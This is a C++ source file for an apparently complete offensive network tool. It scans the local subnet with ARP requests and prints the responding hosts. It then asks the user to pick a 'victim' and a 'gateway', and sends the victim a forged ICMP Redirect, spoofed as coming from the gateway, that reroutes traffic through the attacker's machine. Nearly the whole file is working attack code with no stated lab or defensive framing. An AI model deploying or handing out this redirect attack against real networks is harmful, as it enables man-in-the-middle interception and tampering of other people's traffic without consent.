#include <iostream>
#include <cstring>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <map>
#include <array>
#include <ctime>
#include <iomanip>
#include <netinet/ip_icmp.h>

#define ETH_HDRLEN 14
#define ARP_HDRLEN 28
#define IP_HDRLEN 20
#define ICMP_HDRLEN 8

using namespace std;

struct arp_header {
    uint16_t hardwaretype;
    uint16_t protocoltype;
    uint8_t hlen;          // hardware address length, which is 6
    uint8_t plen;          // protocol address length, which is 4
    uint16_t opertype;
    uint8_t senderMAC[6];   //6 bytes, ex: FF:FF:FF:FF
    uint8_t senderIP[4];    //4 bytes, ex: 10.0.2.11
    uint8_t targetMAC[6];
    uint8_t targetIP[4];
};

uint16_t checksum(uint16_t* addr, int len) {
    int count = len;
    uint32_t sum = 0;
    uint16_t answer = 0;

    while (count > 1) {
        sum += *addr++;
        count -= 2;
    }

    if (count > 0)
        sum += *(uint8_t*)addr;

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    answer = ~sum;
    return answer;
}

// get Mac & Ip address from iface network interface
void getMacIp(const string& iface, uint8_t* mac, uint8_t* ip) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFHWADDR, &ifr);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    
    ioctl(fd, SIOCGIFADDR, &ifr);
    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    memcpy(ip, &ipaddr->sin_addr, 4);
    close(fd);
}


void sendArpRequest(
    int sockfd, 
    const string& iface, 
    const uint8_t* srcMAC, 
    const uint8_t* srcIP, 
    const uint8_t* targetIP, 
    struct sockaddr_ll* device
) {
    // Ethernet Header 
    uint8_t buffer[ETH_HDRLEN + ARP_HDRLEN] = {0};

    // eth pointer points at the address of the starting buffer address
    ether_header* eth = (ether_header*)buffer;
    arp_header* arp = (arp_header*)(buffer + ETH_HDRLEN);

    memset(eth->ether_dhost, 0xff, 6);  
    memcpy(eth->ether_shost, srcMAC, 6);
    eth->ether_type = htons(ETH_P_ARP);

    arp->hardwaretype = htons(1);
    arp->protocoltype = htons(ETH_P_IP);
    arp->hlen = 6;
    arp->plen = 4;
    arp->opertype = htons(1);  // ARP request
    memcpy(arp->senderMAC, srcMAC, 6);
    memcpy(arp->senderIP, srcIP, 4);
    memset(arp->targetMAC, 0, 6);
    memcpy(arp->targetIP, targetIP, 4);

    sendto(sockfd, buffer, sizeof(buffer), 0, (sockaddr*)device, sizeof(*device));
}

void listenForReplies(int sockfd, map<int, pair<uint32_t, array<uint8_t, 6>>>& mp) {
    uint8_t buffer[65536];
    clock_t start_time = clock();
    int index = 0;

    while (true) {
        // setting time out
        if ((clock() - start_time) / (double)CLOCKS_PER_SEC > 1.0) break;

        ssize_t len = recv(sockfd, buffer, sizeof(buffer), MSG_DONTWAIT);
        if (len < (ETH_HDRLEN + ARP_HDRLEN)) continue;
        
        // check if it is arp request 
        ether_header* eth = (ether_header*)buffer;
        if (ntohs(eth->ether_type) != ETH_P_ARP) continue;

        arp_header* arp = (arp_header*)(buffer + ETH_HDRLEN);
        if (ntohs(arp->opertype) != 2) continue;

        uint32_t ip_addr;
        memcpy(&ip_addr, arp->senderIP, 4);

        array<uint8_t, 6> mac;
        memcpy(mac.data(), arp->senderMAC, 6);

        mp[index++] = {ip_addr, mac};
    }
}



void sendIcmpRedirect(
    int sockfd,
    const string& iface,
    const string& icmp_redirect_address, 
    const array<uint8_t, 6>& attackerMAC,
    const array<uint8_t, 6>& victimMAC,
    uint32_t victimIP,
    uint32_t gatewayIP,
    uint32_t attackerIP
) {
    uint8_t buffer[ETH_HDRLEN + IP_HDRLEN + ICMP_HDRLEN + IP_HDRLEN + 64] = {0};

    // Ethernet
    struct ether_header* eth = (struct ether_header*)buffer;
    memcpy(eth->ether_shost, attackerMAC.data(), 6);
    memcpy(eth->ether_dhost, victimMAC.data(), 6);
    eth->ether_type = htons(ETH_P_IP);

    // IP Header
    struct ip* iphdr = (struct ip*)(buffer + ETH_HDRLEN);
    iphdr->ip_hl = 5;
    iphdr->ip_v = 4;
    iphdr->ip_tos = 0;
    iphdr->ip_len = htons(IP_HDRLEN + ICMP_HDRLEN + IP_HDRLEN + 64);
    iphdr->ip_id = htons(0);
    iphdr->ip_off = 0;
    iphdr->ip_ttl = 64;
    iphdr->ip_p = IPPROTO_ICMP;
    iphdr->ip_sum = 0;
    iphdr->ip_src.s_addr = gatewayIP;    // Pretend to be the gateway
    iphdr->ip_dst.s_addr = victimIP;
    iphdr->ip_sum = checksum((uint16_t*)iphdr, IP_HDRLEN);

    // ICMP Redirect
    struct icmphdr* icmp = (struct icmphdr*)(buffer + ETH_HDRLEN + IP_HDRLEN);
    icmp->type = 5;     // Redirect
    icmp->code = 1;     // Redirect for host
    icmp->checksum = 0;
    icmp->un.gateway = attackerIP; // Redirect target is attacker

    // Add original Internet header from victim ip to redirect address 
    struct ip* orig_ip = (struct ip*)(buffer + ETH_HDRLEN + IP_HDRLEN + ICMP_HDRLEN);

    orig_ip->ip_hl = 5;
    orig_ip->ip_v = 4;
    orig_ip->ip_tos = 0;
    orig_ip->ip_len = htons(IP_HDRLEN + 64);   
    orig_ip->ip_id = htons(0);         
    orig_ip->ip_off = 0;
    orig_ip->ip_ttl = 64;
    orig_ip->ip_p = IPPROTO_ICMP;          
    orig_ip->ip_sum = 0;
    orig_ip->ip_src.s_addr = victimIP;    
    orig_ip->ip_dst.s_addr = inet_addr(icmp_redirect_address.c_str());
    
    orig_ip->ip_sum = checksum((uint16_t*)orig_ip, IP_HDRLEN);


    // ICMP Echo header inside the embedded packet
    uint8_t* echo_data = (uint8_t*)(buffer + ETH_HDRLEN + IP_HDRLEN + ICMP_HDRLEN + IP_HDRLEN);
    echo_data[0] = 0;         // ICMP Echo Request type
    echo_data[1] = 0;         // Code
    echo_data[2] = 0xFF;      // Checksum high byte
    echo_data[3] = 0xFF;      // Checksum low byte
    echo_data[4] = 0x00;      // Identifier high byte
    echo_data[5] = 0x00;      // Identifier low byte
    echo_data[6] = 0x00;      // Sequence number high byte
    echo_data[7] = 0x00;      // Sequence number low byte

    // Zero the rest of the 64-byte ICMP Echo payload
    memset(echo_data + 8, 0, 64 - 8);

    int icmp_total_len = ICMP_HDRLEN + IP_HDRLEN + 64;
    icmp->checksum = checksum((uint16_t*)icmp, icmp_total_len);


    // Send
    struct sockaddr_ll device{}; 
    device.sll_ifindex = if_nametoindex(iface.c_str());
    device.sll_family = AF_PACKET;
    memcpy(device.sll_addr, victimMAC.data(), 6);
    device.sll_halen = 6;

    if (sendto(sockfd, buffer, ETH_HDRLEN + IP_HDRLEN + icmp_total_len, 0, (struct sockaddr*)&device, sizeof(device)) < 0) {
        perror("sendto ICMP redirect");
    } else {
        cout << "ICMP Redirect sent to victim."<< endl;
    }
}

int main(int argc, char *argv[]) {
    const string icmp_redirect_address = argv[1];
    const string iface = argv[2];

    // Get my mac & ip address
    uint8_t srcMAC[6], srcIP[4];
    getMacIp(iface, srcMAC, srcIP);

    // Set a raw socket 
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    
    // Data Link Communication (Layer2) Header
    sockaddr_ll device{};
    device.sll_ifindex = if_nametoindex(iface.c_str());
    device.sll_family = AF_PACKET;
    memcpy(device.sll_addr, srcMAC, 6);
    device.sll_halen = 6;

    cout << "Scanning subnet...\n";
    for (int i = 1; i <= 254; ++i) {
        // Broadcast Arp Request to every Ip address in this subnet 
        uint8_t targetIP[4];
        memcpy(targetIP, srcIP, 3);
        targetIP[3] = i;
        sendArpRequest(sockfd, iface, srcMAC, srcIP, targetIP, &device);
        usleep(1000);
    }

    map<int, pair<uint32_t, array<uint8_t, 6>>> mp;
    cout << "Listening for ARP replies...\n";
    listenForReplies(sockfd, mp);

    cout << "Available devices:\n";
    cout << "-----------------------------------------------------\n";
    cout << "| Index |     IP Address     |     MAC Address      |\n";
    cout << "-----------------------------------------------------\n";
    for (const auto& [index, entry] : mp) {
        struct in_addr ip;
        ip.s_addr = entry.first;
        const auto& mac = entry.second;

        printf("| %-5d | %-17s | %02X:%02X:%02X:%02X:%02X:%02X |\n",
               index,
               inet_ntoa(ip),
               mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }
    cout << "-----------------------------------------------------\n";

    int victim_index, gateway_index;
    cout << "Select Victim Index: ";
    cin >> victim_index;
    cout << "Select Gateway Index: ";
    cin >> gateway_index;
    
    struct in_addr victimIP, gatewayIP, attackerIP;
    
    victimIP.s_addr = mp[victim_index].first;
    gatewayIP.s_addr = mp[gateway_index].first;
    memcpy(&attackerIP, srcIP, 4);
    
    cout<<"Victim IP: "<< inet_ntoa(victimIP)<< " "; 
    cout<<"Gateway IP: "<< inet_ntoa(gatewayIP)<< " "; 
    cout<<"Attacker IP: "<< inet_ntoa(attackerIP)<< endl; 
    
    sendIcmpRedirect(
        sockfd,
        iface,
        icmp_redirect_address,
        array<uint8_t, 6>{srcMAC[0], srcMAC[1], srcMAC[2], srcMAC[3], srcMAC[4], srcMAC[5]},
        mp[victim_index].second,
        victimIP.s_addr,
        gatewayIP.s_addr,
        attackerIP.s_addr
    );

    close(sockfd);
    return 0;
}
